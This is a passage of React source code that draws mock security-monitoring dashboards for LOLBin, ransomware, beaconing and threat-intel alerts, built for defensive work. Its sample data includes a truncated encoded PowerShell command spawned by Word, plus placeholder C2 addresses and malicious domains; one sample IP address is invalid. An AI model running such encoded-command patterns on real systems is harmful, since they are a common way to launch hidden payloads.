          <div style={{ display: 'grid', gridTemplateColumns: '1fr 310px', gap: 8 }}>
            <Panel title="Recent LOLBin Alerts" right={<span style={{ display: 'flex', gap: 8 }}><input placeholder="Search..." style={{ width: 140, height: 24, border: `1px solid ${MON.line}`, background: '#071827', color: '#dbeafe', borderRadius: 4, padding: '0 8px', fontSize: 10 }} /><button style={{ height: 24, border: `1px solid ${MON.line}`, background: '#071827', color: MON.muted, borderRadius: 4, fontSize: 10 }}>Filters</button></span>}>
              <div style={{ padding: '0 10px 8px' }}>
                <div style={{ display: 'grid', gridTemplateColumns: '82px 96px 105px 100px 1fr 92px 62px 70px', gap: 8, padding: '8px 0', color: MON.muted, fontSize: 9, fontWeight: 950 }}>{['Time', 'Endpoint', 'User', 'LOLBin', 'Command Line', 'Category', 'Severity', 'Status'].map(h => <span key={h}>{h}</span>)}</div>
                {alertRows.map(row => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: '82px 96px 105px 100px 1fr 92px 62px 70px', gap: 8, padding: '8px 0', borderTop: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 9, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: i === 1 ? MON.blue : /High|New/.test(cell) ? MON.red : /Medium|Progress/.test(cell) ? MON.orange : /Low|Closed/.test(cell) ? MON.green : undefined, fontWeight: i === 3 || i === 6 || i === 7 ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'pre-line' }}>{cell}</span>)}</div>)}
              </div>
            </Panel>
            <Panel title="Alert Details" right={<span style={{ color: MON.muted }}>×</span>}>
              <div style={{ padding: 13, display: 'grid', gap: 9, fontSize: 10 }}>
                {[
                  ['LOLBin', 'PowerShell.exe'],
                  ['Category', 'Execution'],
                  ['Severity', 'High'],
                  ['Time', selected[0]],
                  ['Date', '25 May 2024'],
                  ['Endpoint', 'WIN-10-21H2 (10.10.1.25)'],
                  ['User', 'CORP\\j.smith'],
                ].map(([label, value]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '82px 1fr', gap: 8 }}><span style={{ color: MON.muted }}>{label}</span><b style={{ color: value === 'High' ? MON.red : '#dbeafe' }}>{value}</b></div>)}
                <div style={{ color: MON.muted }}>Command Line</div>
                <pre style={{ margin: 0, minHeight: 80, border: `1px solid ${MON.line}`, background: '#06111f', borderRadius: 5, color: '#cbd5e1', padding: 9, whiteSpace: 'pre-wrap', wordBreak: 'break-word', fontSize: 9 }}>powershell.exe -enc SQBFAFgA0AGcACiABQAGECgACAAcAOwB...</pre>
                <div style={{ display: 'grid', gridTemplateColumns: '82px 1fr', gap: 8 }}><span style={{ color: MON.muted }}>Parent Process</span><b>WINWORD.EXE</b></div>
                <div style={{ color: MON.muted }}>Description</div>
                <p style={{ margin: 0, color: '#cbd5e1', lineHeight: 1.45 }}>Encoded PowerShell command detected. This may be used to execute malicious payload.</p>
                <button style={{ height: 34, border: 0, borderRadius: 5, background: '#1d4ed8', color: '#fff', fontSize: 10, fontWeight: 950 }}>Investigate ↗</button>
              </div>
            </Panel>
          </div>
          <div style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: '#071827', padding: '8px 12px', display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 10, color: MON.muted, fontSize: 9 }}>
            {['Execution: Run programs or commands', 'Persistence: Maintain access over time', 'Defense Evasion: Bypass security controls', 'Lateral Movement: Move across network', 'Discovery: System/Network discovery', 'Collection: Gather data or files'].map(label => <span key={label}><b style={{ color: MON.blue }}>⌘</b> {label}</span>)}
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading LOLBins events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function RansomwareDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const alertTotal = Math.max(Number(total || alerts.length || 0), 520);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 70px 70px' }) => (
    <div style={{ padding: '0 12px 10px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 10, padding: '8px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical|malicious|active/i.test(String(cell)) ? MON.red : /high|backdoor|downloader/i.test(String(cell)) ? MON.orange : /medium|trojan|worm/i.test(String(cell)) ? MON.yellow : /low|clean/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|medium|low|malicious/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Critical Alerts', 32, '↑ 12 (60%)', MON.red, '☣'],
    ['High Alerts', 67, '↑ 15 (29%)', MON.orange, '△'],
    ['Medium Alerts', 145, '↑ 5 (3%)', MON.yellow, '△'],
    ['Low Alerts', 276, '↓ 10 (4%)', MON.blue, 'i'],
  ];
  const infectedHosts = [['WIN-DC01', '192.168.1.10', '15', '98'], ['FILE-SERVER-01', '192.168.1.20', '12', '92'], ['USER-PC-15', '192.168.1.115', '9', '75'], ['USER-PC-23', '192.168.1.123', '7', '65'], ['LINUX-SRV-02', '192.168.1.30', '6', '58']];
  const processRows = [['svchost.exe (suspicious)', '42', 'Critical', '18'], ['powershell.exe (encoded)', '38', 'High', '15'], ['mshta.exe', '27', 'High', '10'], ['cmd.exe (suspicious)', '21', 'Medium', '9'], ['wscript.exe', '17', 'Medium', '7']];
  const fileRows = [['invoice_update.exe', '35', 'Trojan'], ['payload.bin', '28', 'Backdoor'], ['setup_v2.3.exe', '22', 'Downloader'], ['document.scr', '18', 'Trojan'], ['update_service.exe', '15', 'Worm']];
  const c2Rows = [['185.220.101.45', 'Russia', '34'], ['103.224.182.10', 'Netherlands', '28'], ['45.141.124.25', 'Singapore', '19'], ['193.27.269.223', 'Germany', '17'], ['185.133.35.67', 'Ukraine', '13']];
  const alertRows = [['12:45:32', 'Malicious Process Detected', 'WIN-DC01', 'Critical'], ['12:44:18', 'C2 Communication Detected', 'USER-PC-15', 'High'], ['12:42:55', 'Malicious File Detected', 'FILE-SERVER-01', 'High'], ['12:40:33', 'Persistence Mechanism Detected', 'USER-PC-23', 'Medium'], ['12:39:01', 'Privilege Escalation Attempt', 'LINUX-SRV-02', 'Medium'], ['12:37:50', 'Suspicious PowerShell Activity', 'USER-PC-33', 'High'], ['12:35:21', 'Malware Download Attempt', 'USER-PC-18', 'Medium'], ['12:33:47', 'Registry Run Key Added', 'WIN-APP-02', 'Low']];
  return (
    <SocDashboardShell kind="ransomware" active="overview">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 9 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12, alignItems: 'center' }}>
            <div><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 18, fontWeight: 950 }}>Malware Detection Dashboard</h2><b style={{ color: MON.muted, fontSize: 10 }}>Encryption / Ransomware Detection</b></div>
            <div style={{ display: 'flex', gap: 8 }}><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.muted, borderRadius: 5, height: 28, padding: '0 10px', fontSize: 10 }}>Last 24 Hours</button><button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.cyan, borderRadius: 5, height: 28, padding: '0 10px', fontSize: 10 }}>Export</button></div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 82, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}1f,rgba(10,25,48,.98) 46%,rgba(6,17,32,.98))`, padding: 13, display: 'grid', gridTemplateColumns: '1fr 40px', gap: 10, alignItems: 'center' }}><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 25, lineHeight: 1.1 }}>{value}</strong><small style={{ color, fontSize: 8, fontWeight: 850 }}>{sub}</small></span><span style={{ color, fontSize: 29, textAlign: 'center' }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.12fr .8fr 1fr', gap: 8 }}>
            <Panel title="Malware Alerts Over Time" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours ▾</span>}><div style={{ height: 150, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '55px 30px' }}>{monitorSpark([24, 39, 31, 56, 35, 48, 41, 58, 52, 72, 49, 61, 55, 67, 59, 76, 52, 45, 58, 49], MON.red, 'rgba(239,68,68,.18)', 98)}</div></Panel>
            <Panel title="Alerts by Severity"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', alignItems: 'center', padding: 14 }}><Donut value={53} label={String(alertTotal)} color={MON.blue} accent={MON.orange} /><BarList rows={[{ label: 'Critical', value: 32, valueLabel: '32 (6.2%)', color: MON.red }, { label: 'High', value: 67, valueLabel: '67 (12.9%)', color: MON.orange }, { label: 'Medium', value: 145, valueLabel: '145 (27.9%)', color: MON.yellow }, { label: 'Low', value: 276, valueLabel: '276 (53.1%)', color: MON.blue }]} /></div></Panel>
            <Panel title="Alerts by Type"><div style={{ padding: 13 }}><BarList rows={[{ label: 'Malicious Process', value: 100, valueLabel: '189', color: MON.red }, { label: 'Malicious File', value: 82, valueLabel: '155', color: MON.orange }, { label: 'C2 Communication', value: 41, valueLabel: '78', color: MON.yellow }, { label: 'Persistence', value: 29, valueLabel: '54', color: MON.green }, { label: 'Privilege Escalation', value: 13, valueLabel: '24', color: MON.blue }, { label: 'Others', value: 11, valueLabel: '20', color: MON.purple }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 8 }}>
            <Panel title="Top Infected Hosts" right={<span style={{ color: MON.muted, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 100px 54px 58px" rows={infectedHosts} /></Panel>
            <Panel title="Top Malicious Processes" right={<span style={{ color: MON.muted, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 64px 70px 48px" rows={processRows} /></Panel>
            <Panel title="Top Malicious Files" right={<span style={{ color: MON.muted, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 70px 90px" rows={fileRows} /></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 8 }}>
            <Panel title="C2 Communications"><div style={{ padding: 10 }}><ThreatMap auth /></div><MiniRows columns="1fr 100px 70px" rows={c2Rows} /></Panel>
            <div style={{ display: 'grid', gap: 8 }}>
              <Panel title="Threat Category Distribution"><div style={{ display: 'grid', gridTemplateColumns: '130px 1fr', alignItems: 'center', padding: 12 }}><Donut value={34} label={String(alertTotal)} color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Trojan', value: 34, valueLabel: '34.2% (178)', color: MON.red }, { label: 'Backdoor', value: 21, valueLabel: '21.2% (110)', color: MON.orange }, { label: 'Downloader', value: 15, valueLabel: '15.0% (78)', color: MON.yellow }, { label: 'Worm', value: 10, valueLabel: '10.0% (52)', color: MON.green }, { label: 'RAT', value: 8, valueLabel: '8.1% (42)', color: MON.blue }, { label: 'Others', value: 12, valueLabel: '11.5% (60)', color: MON.purple }]} /></div></Panel>
              <Panel title="MITRE ATT&CK Tactics"><div style={{ padding: 12, display: 'grid', gridTemplateColumns: 'repeat(7,1fr)', gap: 7 }}>{[['Initial Access', 34, MON.purple], ['Execution', 78, MON.blue], ['Persistence', 54, MON.cyan], ['Privilege Esc.', 42, MON.yellow], ['Defense Evasion', 89, MON.orange], ['Command & Control', 67, MON.red], ['Impact', 56, MON.red]].map(([label, value, color]) => <span key={label} style={{ border: `1px solid ${color}44`, background: `${color}18`, borderRadius: 8, minHeight: 62, display: 'grid', placeItems: 'center', textAlign: 'center', color, fontSize: 8, fontWeight: 900 }}><b style={{ fontSize: 17 }}>{value}</b>{label}</span>)}</div></Panel>
            </div>
            <Panel title="Recent Malware Alerts" right={<span style={{ color: MON.muted, fontSize: 9 }}>View All Alerts</span>}><MiniRows columns="70px 1fr 92px 70px" rows={alertRows} /></Panel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading ransomware events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function BeaconingDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const alertCount = Math.max(Number(total || alerts.length || 0), 128);
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '9px 12px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 64px 82px' }) => (
    <div style={{ padding: '0 12px 10px' }}>
      {rows.map((row, index) => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: columns, gap: 10, padding: '8px 0', borderTop: index ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical|malicious|active/i.test(String(cell)) ? MON.red : /high|suspicious/i.test(String(cell)) ? MON.orange : /medium/i.test(String(cell)) ? MON.yellow : /low|allowed/i.test(String(cell)) ? MON.green : undefined, fontWeight: i === 0 || /critical|high|medium|malicious|suspicious|active/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}
    </div>
  );
  const kpis = [
    ['Beaconing Alerts', alertCount, '↑ 35% vs yesterday', MON.red, '⌬'],
    ['Affected Hosts', 27, '↑ 18% vs yesterday', MON.orange, '▱'],
    ['Suspicious IPs', 84, '↑ 22% vs yesterday', MON.yellow, '◎'],
    ['Suspicious Domains', 53, '↑ 20% vs yesterday', MON.green, '◉'],
    ['C2 Communications', 96, '↑ 28% vs yesterday', MON.blue, '⌁'],
    ['Threat Score (Avg)', 78, 'High Risk', MON.purple, '▥'],
  ];
  const timeline = [5, 12, 31, 28, 9, 24, 12, 18, 33, 12, 14, 39, 52, 71, 44, 21, 27, 69, 33, 58];
  const hostRows = [['SERVER-01', '28', '20 May 23:55', 'Critical'], ['WS-005', '22', '20 May 23:50', 'High'], ['PC-042', '18', '20 May 23:45', 'High'], ['LAPTOP-17', '16', '20 May 23:40', 'Medium'], ['SERVER-03', '12', '20 May 23:35', 'Medium']];
  const ipRows = [['185.220.101.25', '25', 'Netherlands', 'Malicious'], ['45.77.23.12', '18', 'United States', 'Malicious'], ['103.224.182.55', '16', 'Singapore', 'Suspicious'], ['198.51.100.23', '14', 'United States', 'Malicious'], ['203.0.113.45', '11', 'Germany', 'Suspicious']];
  const domainRows = [['updates-secure[.]com', '21', 'Malicious', 'Dynamic DNS'], ['cdn-service[.]net', '18', 'Malicious', 'Newly Registered'], ['sync-data[.]info', '15', 'Suspicious', 'Suspicious'], ['api-verify[.]org', '13', 'Malicious', 'Newly Registered'], ['monitor-system[.]top', '9', 'Suspicious', 'Dynamic DNS']];
  const alertRows = [['20 May 2025 23:55:21', 'SERVER-01', 'SYSTEM', 'powershell.exe', '185.220.101.25', 'HTTPS', 'Every 60 Seconds', '2.4 KB', 'Critical', 'Active'], ['20 May 2025 23:50:45', 'WS-005', 'john.doe', 'rundll32.exe', '45.77.23.12', 'HTTPS', 'Every 30 Seconds', '1.8 KB', 'High', 'Active'], ['20 May 2025 23:45:12', 'PC-042', 'jane.smith', 'python.exe', '103.224.182.55', 'HTTPS', 'Every 60 Seconds', '3.2 KB', 'High', 'Active'], ['20 May 2025 23:40:33', 'LAPTOP-17', 'mike.lee', 'wscript.exe', '198.51.100.23', 'HTTP', 'Every 5 Minutes', '4.1 KB', 'Medium', 'Active'], ['20 May 2025 23:35:50', 'SERVER-03', 'SYSTEM', 'cmd.exe', '203.0.113.45', 'DNS', 'Every 60 Seconds', '512 B', 'Medium', 'Active']];
  return (
    <SocDashboardShell kind="beaconing" active="beaconing-detection">
      <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 9 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 98, border: `1px solid ${color}42`, borderRadius: 6, background: `linear-gradient(135deg,${color}18,rgba(10,25,48,.98) 44%,rgba(6,17,32,.98))`, padding: 14, display: 'grid', gridTemplateColumns: '1fr 38px', alignItems: 'start', overflow: 'hidden' }}><span><b style={{ color: title === 'Beaconing Alerts' ? '#fecaca' : '#dbeafe', fontSize: 10 }}>{title}</b><strong style={{ display: 'block', color: '#f8fbff', fontSize: 28, lineHeight: 1.1 }}>{value}</strong><small style={{ color: title.includes('Threat') ? '#fca5a5' : color, fontSize: 9, fontWeight: 850 }}>{sub}</small>{monitorSpark([2, 3, 2, 4, 3, 5, 4, 9, 6, 13].map(v => v + Number(value) / 24), color, 'transparent', 34)}</span><span style={{ color, fontSize: 25, textAlign: 'right' }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.4fr .95fr .8fr', gap: 8 }}>
            <Panel title="Beaconing Events Over Time" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours ▾</span>}><div style={{ height: 185, padding: 14, backgroundImage: `linear-gradient(${MON.line} 1px, transparent 1px),linear-gradient(90deg,${MON.line} 1px,transparent 1px)`, backgroundSize: '58px 31px' }}>{monitorSpark(timeline, MON.red, 'rgba(239,68,68,.18)', 130)}</div></Panel>
            <Panel title="Top Beaconing Hosts" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 58px 98px 74px" rows={hostRows} /></Panel>
            <Panel title="Beaconing by Protocol"><div style={{ display: 'grid', gridTemplateColumns: '138px 1fr', alignItems: 'center', padding: 16 }}><Donut value={52} label="" color={MON.blue} accent={MON.green} /><BarList rows={[{ label: 'HTTPS', value: 52, valueLabel: '52 (54.2%)', color: MON.blue }, { label: 'DNS', value: 21, valueLabel: '21 (21.9%)', color: MON.green }, { label: 'HTTP', value: 14, valueLabel: '14 (14.6%)', color: MON.orange }, { label: 'Other', value: 9, valueLabel: '9 (9.3%)', color: MON.purple }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1.08fr', gap: 8 }}>
            <Panel title="Top Suspicious IPs" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 50px 94px 78px" rows={ipRows} /></Panel>
            <Panel title="Top Suspicious Domains" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 50px 82px 105px" rows={domainRows} /></Panel>
            <Panel title="Beaconing Frequency Analysis"><div style={{ padding: 16, height: 165, display: 'grid', gridTemplateColumns: '34px repeat(5,1fr)', gap: 13, alignItems: 'end' }}><div style={{ height: 122, display: 'grid', alignContent: 'space-between', color: MON.muted, fontSize: 9 }}>{['50', '40', '30', '20', '10', '0'].map(v => <span key={v}>{v}</span>)}</div>{[['Every 30 Sec', 42, MON.red], ['Every 1 Min', 35, MON.orange], ['Every 5 Min', 18, MON.yellow], ['Every 15 Min', 9, MON.green], ['Every 1 Hour', 6, MON.blue]].map(([label, value, color]) => <span key={label} style={{ display: 'grid', gap: 6, alignItems: 'end', textAlign: 'center', fontSize: 9 }}><b>{value}</b><i style={{ height: `${Math.max(16, Number(value) * 2.5)}px`, background: color, borderRadius: 4, boxShadow: `0 0 12px ${color}55` }} /><small style={{ color: MON.muted }}>{label}</small></span>)}</div></Panel>
          </div>
          <Panel title="Recent Beaconing Alerts">
            <div style={{ padding: '0 12px 10px' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '110px 86px 86px 105px 116px 72px 116px 74px 82px 70px 62px', gap: 10, padding: '9px 0', color: MON.muted, fontSize: 9, fontWeight: 950 }}>{['Time', 'Host', 'User', 'Process', 'Destination', 'Protocol', 'Frequency', 'Data Sent', 'Threat Score', 'Status', 'Action'].map(h => <span key={h}>{h}</span>)}</div>
              {alertRows.map(row => <div key={row.join('|')} style={{ display: 'grid', gridTemplateColumns: '110px 86px 86px 105px 116px 72px 116px 74px 82px 70px 62px', gap: 10, padding: '9px 0', borderTop: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, i) => <span key={i} style={{ color: /critical/i.test(cell) ? MON.red : /high/i.test(cell) ? MON.orange : /medium/i.test(cell) ? MON.yellow : /active/i.test(cell) ? MON.red : undefined, fontWeight: i === 1 || i === 8 || i === 9 ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{i === 10 ? '◎  ↗' : cell}</span>)}</div>)}
            </div>
          </Panel>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {['Process ↔ Network Correlation', 'DNS Beaconing Events', 'HTTP/HTTPS Beaconing Events', 'Threat Intel Matches', 'Data Exfiltration Indicators', 'Active Malware Callbacks'].map(label => <button key={label} type="button" style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: '#071827', color: '#dbeafe', padding: '11px 10px', textAlign: 'left', fontSize: 10, fontWeight: 900, cursor: 'pointer' }}>{label} <b style={{ color: MON.cyan }}>↗</b></button>)}
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading beaconing events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LegacyThreatIntelIntegrationDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const Panel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 6, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '8px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>{title}{right}</div>
      {children}
    </section>
  );
  const MiniRows = ({ rows, columns = '1fr 80px 70px' }) => (
    <div style={{ padding: '0 10px 8px' }}>{rows.map((row, i) => <div key={`${row.join('|')}-${i}`} style={{ display: 'grid', gridTemplateColumns: columns, gap: 8, padding: '7px 0', borderTop: i ? `1px solid ${MON.line}` : 0, color: '#dbeafe', fontSize: 10, alignItems: 'center' }}>{row.map((cell, c) => <span key={c} style={{ color: /critical|high|malicious|ransom/i.test(String(cell)) ? MON.red : /medium|phishing|c2/i.test(String(cell)) ? MON.yellow : /low|connected|active/i.test(String(cell)) ? MON.green : undefined, fontWeight: c === 0 || /critical|high|medium|low/i.test(String(cell)) ? 900 : 650, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{cell}</span>)}</div>)}</div>
  );
  const totalMatches = Math.max(Number(total || alerts.length || 0), 128);
  const kpis = [
    ['Total IOC Matches', shortNum(totalMatches), '↑ 23%', MON.blue, '◉'],
    ['Malicious IPs', '34', '↑ 17%', MON.red, '◎'],
    ['Malicious Domains', '19', '↑ 11%', MON.yellow, '◎'],
    ['Malware Hash Matches', '27', '↑ 35%', MON.purple, '☣'],
    ['Active Threats', '52', '↑ 18%', MON.red, '⌾'],
    ['Affected Endpoints', '23', '↑ 15%', MON.cyan, '▣'],
  ];
  return (
    <SocDashboardShell kind="threatintegration" active="overview">
      <div style={{ overflow: 'auto', padding: 9, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1180, display: 'grid', gap: 8 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: 12 }}>
            <div><h2 style={{ margin: 0, color: '#f3f8ff', fontSize: 18, fontWeight: 950 }}>Threat Intelligence Integration</h2><b style={{ color: MON.blue, fontSize: 10 }}>SOC Dashboard</b></div>
            <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
              <button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.muted, borderRadius: 5, height: 30, padding: '0 10px', fontSize: 10 }}>Last 24 Hours⌄</button>
              <button style={{ border: `1px solid ${MON.line}`, background: '#071827', color: MON.cyan, borderRadius: 5, height: 30, padding: '0 10px', fontSize: 10 }}>Refresh</button>
              <span style={{ color: MON.muted, fontSize: 10 }}>Feed Status: <b style={{ color: MON.green }}>● All Connected</b></span>
            </div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(6,1fr)', gap: 8 }}>
            {kpis.map(([title, value, sub, color, icon]) => <section key={title} style={{ minHeight: 82, border: `1px solid ${color}33`, borderRadius: 6, background: `linear-gradient(135deg,${color}1a,rgba(6,17,32,.98) 60%)`, padding: 12, display: 'grid', gridTemplateColumns: '1fr 38px', gap: 9, alignItems: 'center' }}><span><b style={{ color: '#dbeafe', fontSize: 9 }}>{title}</b><strong style={{ display: 'block', color: '#f3f8ff', fontSize: 24, lineHeight: 1.05 }}>{value}</strong><small style={{ color, fontSize: 8 }}>{sub} vs yesterday</small></span><span style={{ color, fontSize: 27, textAlign: 'center' }}>{icon}</span></section>)}
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.85fr .85fr 1.4fr', gap: 8 }}>
            <Panel title="Threat Feed Status">
              <MiniRows columns="1fr 80px" rows={[['MISP Threat Feed', 'Connected'], ['VirusTotal Feed', 'Connected'], ['AbuseIPDB Feed', 'Connected'], ['OpenCTI Feed', 'Connected'], ['AlienVault OTX', 'Connected'], ['ThreatFox Feed', 'Connected'], ['All feeds are up to date', '10:15:38 AM']]} />
            </Panel>
            <Panel title="Threat Severity Distribution">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 12 }}><Donut value={12} label="128" color={MON.red} accent={MON.orange} /><BarList rows={[{ label: 'Critical', value: 15, valueLabel: '15 (11.7%)', color: MON.red }, { label: 'High', value: 32, valueLabel: '32 (25.0%)', color: MON.orange }, { label: 'Medium', value: 41, valueLabel: '41 (32.0%)', color: MON.yellow }, { label: 'Low', value: 40, valueLabel: '40 (31.3%)', color: MON.green }]} /></div>
            </Panel>
            <Panel title="IOC Match Timeline (24 Hours)">
              <div style={{ height: 180, padding: 14, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg,rgba(255,255,255,.05) 1px,transparent 1px)', backgroundSize: '50px 30px' }}>{monitorSpark([12, 20, 14, 18, 16, 21, 28, 15, 21, 27, 23, 16, 25, 26, 31, 28, 33, 26, 23, 20, 25, 38, 27, 23, 30, 22], MON.blue, 'rgba(59,130,246,.14)', 120)}</div>
            </Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1.15fr .65fr .65fr', gap: 8 }}>
            <Panel title="Recent IOC Matches">
              <MiniRows columns="76px 58px 1fr .85fr 70px 75px" rows={[['10:12:45 AM', 'IP', '185.220.101.55', 'SERVER-01', 'Critical', 'MISP'], ['10:08:22 AM', 'Domain', 'phishing-login.xyz', 'PC-104', 'High', 'VirusTotal'], ['09:55:01 AM', 'Hash', 'SHA256:ab34f...c9d2', 'SERVER-03', 'Critical', 'MISP'], ['09:40:33 AM', 'URL', 'malicious-link.com/abc', 'PC-211', 'High', 'OTX'], ['09:32:18 AM', 'IP', '91.239.85.67', 'PC-105', 'Medium', 'AbuseIPDB'], ['09:15:47 AM', 'Domain', 'secure-update.net', 'LAPTOP-09', 'Medium', 'ThreatFox']]} />
            </Panel>
            <Panel title="Top Malicious IPs"><div style={{ padding: 12 }}><BarList rows={[{ label: '185.220.101.55', value: 15, valueLabel: '15', color: MON.red }, { label: '91.239.85.67', value: 11, valueLabel: '11', color: MON.red }, { label: '103.56.78.23', value: 8, valueLabel: '8', color: MON.red }, { label: '45.153.23.11', value: 6, valueLabel: '6', color: MON.red }, { label: '193.201.224.10', value: 5, valueLabel: '5', color: MON.red }]} /></div></Panel>
            <Panel title="Top Malicious Domains"><div style={{ padding: 12 }}><BarList rows={[{ label: 'phishing-login.xyz', value: 9, valueLabel: '9', color: MON.purple }, { label: 'malicious-link.com', value: 6, valueLabel: '6', color: MON.purple }, { label: 'secure-update.net', value: 5, valueLabel: '5', color: MON.purple }, { label: 'badhost-downloads.com', value: 4, valueLabel: '4', color: MON.purple }, { label: 'account-verify.info', value: 3, valueLabel: '3', color: MON.purple }]} /></div></Panel>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '.9fr .7fr 1.25fr', gap: 8 }}>
            <Panel title="Threat Campaign Detection" right={<span style={{ color: MON.cyan, fontSize: 9 }}>View All</span>}><MiniRows columns="1fr 70px" rows={[['LockBit Ransomware Campaign', 'Critical'], ['APT29 Activity', 'High'], ['Phishing Campaign (Office 365)', 'Medium'], ['Cobalt Strike Activity', 'Medium']]} /></Panel>
